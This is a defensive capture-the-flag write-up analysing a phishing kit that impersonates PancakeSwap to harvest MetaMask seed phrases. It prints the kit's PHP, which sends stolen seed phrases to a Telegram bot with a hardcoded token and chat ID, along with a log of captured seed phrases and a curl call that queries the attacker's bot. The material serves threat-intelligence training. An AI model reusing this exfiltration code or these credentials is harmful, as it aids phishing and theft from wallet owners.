# GrabThePhisher

## Scenario

In [this Cyberdefenders challenge](https://cyberdefenders.org/blueteam-ctf-challenges/95), an attacker compromised a server and impersonated <nolink>https://pancakeswap.finance</nolink>, a decentralized exchange native to BNB Chain, to host a phishing kit at <nolink>https://apankewk.soup.xyz/mainpage.php</nolink>. The attacker set it as an open directory with the file name "pankewk.zip". 

Provided the phishing kit, you as a soc analyst are requested to analyze it and do your threat intel homework.

## Tools used

* [Telegram API](https://core.telegram.org/bots/api#available-methods)

## Questions

***Q1 Which wallet is used for asking the seed phrase?***     

***Q2 What is the file name that has the code for the phishing kit?*** 

```text
sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk
$ ls
background1.jpg  background2.jpg  background.jpg  cgi-bin  favicon.ico  images  index.html  log  logo.png  metamask  _next  src
sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk
$ cd metamask
sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk/metamask
$ ls
fonts  index.html  metamask.php
```

***Q3 In which language was the kit written?*** 

```text
php
```

***Q4 What service does the kit use to retrieve the victim's machine information?*** 

```text
sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk/metamask
$ nano metamask.php
```

```text
<?php

$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
```

***Q5 How many seed phrases were already collected?***

```text
sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk
$ cd log
sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk/log
$ ls
log.txt
sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk/log
$ cat log.txt
number edge rebuild stomach review course sphere absurd memory among drastic total
bomb stairs satisfy host barrel absorb dentist prison capital faint hedgehog worth
father also recycle embody balance concert mechanic believe owner pair muffin hockey
```

***Q6 Write down the seed phrase of the most recent phishing incident?*** 

```text
father also recycle embody balance concert mechanic believe owner pair muffin hockey
```

***Q7 Which medium had been used for credential dumping?*** 

***Q8 What is the token for the channel?*** 

***Q9 What is the chat ID of the phisher's channel?*** 

```text
sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk/metamask
$ nano metamask.php
```

```text
sendTel($message);  

    function sendTel($message){
                $id = "5442785564"; 
        $token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10"; 
                $filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
                file_get_contents($filename);
        $_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
        @file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);    

    }
```

***Q10 What are the allies of the phish kit developer?***

```text
/*
 With love and respect to all the hustler out there,
 This is a small gift to my brothers,
 All the best with your luck,
 
 Regards, 
 j1j1b1s@m3r0
  
  */
```

***Q11 What is the full name of the Phish Actor?***

***Q12 What is the username of the Phish Actor?*** 

```text
$ curl  https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat?chat_id=5442785564 | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   160  100   160    0     0    403      0 --:--:-- --:--:-- --:--:--   402
{
  "ok": true,
  "result": {
    "id": 5442785564,
    "first_name": "Marcus",
    "last_name": "Aurelius",
    "username": "pumpkinboii",
    "type": "private",
    "active_usernames": [
      "pumpkinboii"
    ]
  }
}
```
